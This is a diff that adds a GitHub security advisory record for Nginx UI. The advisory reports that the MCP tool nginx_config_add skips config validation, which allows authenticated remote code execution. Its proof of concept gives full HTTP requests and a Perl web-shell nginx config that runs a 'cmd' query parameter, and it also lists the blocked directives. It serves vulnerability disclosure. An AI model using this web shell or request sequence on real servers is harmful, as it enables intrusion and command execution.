@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-9jww-cxg5-rj9m",
+  "modified": "2026-10-15T20:30:04.543380203Z",
+  "published": "2026-10-15T20:11:18Z",
+  "aliases": [
+    "CVE-2026-84318"
+  ],
+  "summary": "Nginx UI: MCP `nginx_config_add` Bypasses Directive Validation — Authenticated RCE",
+  "details": "### Summary\n\nThe MCP tool `nginx_config_add` writes nginx configuration files to disk and triggers an nginx reload without calling `config.ValidateConfigFile`. The identical flow in the REST API (`POST /api/configs`) does call that function and correctly rejects dangerous directives. An authenticated attacker can exploit this gap to write config files containing any blocked directive (`perl`, `js_import`, `load_module`, `user root`, etc.), bypassing nginx-ui's entire security layer. On a server with the nginx Perl, njs, or Lua module loaded, this is post-authentication Remote Code Execution.\n\n### Details\n\n`api/config/add.go` (line 46) calls `config.ValidateConfigFile` before writing:\n\n```go\nerr = config.ValidateConfigFile(path, content)  // validates directives, checks blocklist\nif err != nil {\n    cosy.ErrHandler(c, err)\n    return\n}\n```\n\n`mcp/config/config_add.go` (line 79) omits that call entirely and writes directly:\n\n```go\nerr = os.WriteFile(path, []byte(content), 0644)  // no ValidateConfigFile, no blocklist check\n...\nres := nginx.Control(nginx.Reload)               // reload triggered immediately\n```\n\n`config.ValidateConfigFile` runs two checks:\n- **`ValidateConfigContent`** — rejects control characters, enforces encoding.\n- **`ValidateConfigDirectives`** — rejects a blocklist of dangerous directives: `perl`, `perl_modules`, `perl_require`, `perl_set`, `js_import`, `js_set`, `js_content`, `load_module` (restricted modules), `user root`, and others.\n\nNeither check runs on the MCP path. Note that `mcp/config/config_modify.go` does call `ValidateConfigFile` correctly — only `config_add.go` is affected.\n\nThe MCP endpoint (`GET /mcp` SSE + `POST /mcp_message` JSON-RPC) accepts the same JWT and node-secret tokens as the REST API, so the attack surface is any authenticated session.\n\n### PoC\n\n**1 — Control: confirm REST API blocks the payload**\n\n```\nPOST /api/configs\nAuthorization: \u003ctoken\u003e\n\n{ \"name\": \"rce.conf\", \"base_dir\": \"conf.d\", \"content\": \"\u003cperl config below\u003e\", \"overwrite\": true }\n```\n\nResponse:\n```\nHTTP 500  scope=config  code=40017\nmessage: file content contains restricted nginx directive: {0}\n```\n\n`ValidateConfigDirectives` rejects `perl` — the REST API is working as intended.\n\n**2 — Open MCP SSE session**\n\n```\nGET /mcp\nAuthorization: \u003ctoken\u003e\nAccept: text/event-stream\n```\n\nExtract `sessionId` from the `endpoint` event.\n\n**3 — MCP initialize handshake**\n\n```\nPOST /mcp_message?sessionId=\u003cid\u003e\n\n{ \"jsonrpc\": \"2.0\", \"id\": 1, \"method\": \"initialize\",\n  \"params\": { \"protocolVersion\": \"2024-11-05\", \"capabilities\": {}, \"clientInfo\": { \"name\": \"poc\", \"version\": \"1.0\" } } }\n```\n\n**4 — Call `nginx_config_add` with the identical blocked payload**\n\n```\nPOST /mcp_message?sessionId=\u003cid\u003e\n\n{\n  \"jsonrpc\": \"2.0\", \"id\": 2, \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"nginx_config_add\",\n    \"arguments\": {\n      \"name\": \"rce_backdoor.conf\",\n      \"base_dir\": \"conf.d\",\n      \"overwrite\": true,\n      \"content\": \"server {\\n    listen 8888;\\n\\n    location /rce {\\n        perl 'sub {\\n            my $r = shift;\\n            my ($cmd) = ($r-\u003eargs =~ /(?:^|\u0026)cmd=([^\u0026]*)/);\\n            $cmd ||= \\\"id\\\";\\n            $r-\u003esend_http_header(\\\"text/plain\\\");\\n            $r-\u003eprint(qx($cmd 2\u003e\u00261));\\n            return OK;\\n        }';\\n    }\\n}\\n\"\n    }\n  }\n}\n```\n\nResponse (`HTTP 200 OK`) — file written to `/etc/nginx/conf.d/rce_backdoor.conf`, nginx reloaded automatically:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"{\\\"content\\\":\\\"...\\\",\\\"file_path\\\":\\\"/etc/managed-nginx/conf.d/rce_backdoor.conf\\\",\\\"name\\\":\\\"rce_backdoor.conf\\\"}\"\n      }\n    ]\n  }\n}\n```\n\nThe `perl` directive — explicitly listed in `blockedConfigDirectives` and rejected by the REST API — passes through without any check.\n\n**5 — Trigger RCE**\n\n```\nGET http://\u003ctarget\u003e:8888/rce?cmd=id\n```\n\n```\nuid=101(nginx) gid=101(nginx) groups=101(nginx)\n```\n\n### Impact\n\nAny authenticated user (valid JWT or node-secret) can write an nginx configuration file containing any directive from the security blocklist. nginx-ui reloads nginx automatically after the write, activating the malicious config immediately. No further interaction is required.\n\nOn servers running nginx with the Perl module (`nginx:mainline-perl`) or nginx+njs, this results in arbitrary OS command execution running as the nginx worker user. Combined with a `user root;` directive (also unblocked via this path), the worker process can be escalated to root before the RCE handler fires.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/0xJacky/Nginx-UI",
+        "purl": "pkg:golang/github.com/0xJacky/Nginx-UI"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.9.10-0.20250506154222-1330888280a2"
+            },
+            {
+              "fixed": "1.9.10-0.20260703131214-23d1934099b0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-9jww-cxg5-rj9m/GHSA-9jww-cxg5-rj9m.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-9jww-cxg5-rj9m"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-84318"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/commit/23d1934099b05b2a01589b48129dc3d3159d91c2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/0xJacky/nginx-ui"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xJacky/nginx-ui/releases/tag/v2.4.1"
+    }
+  ]
+}
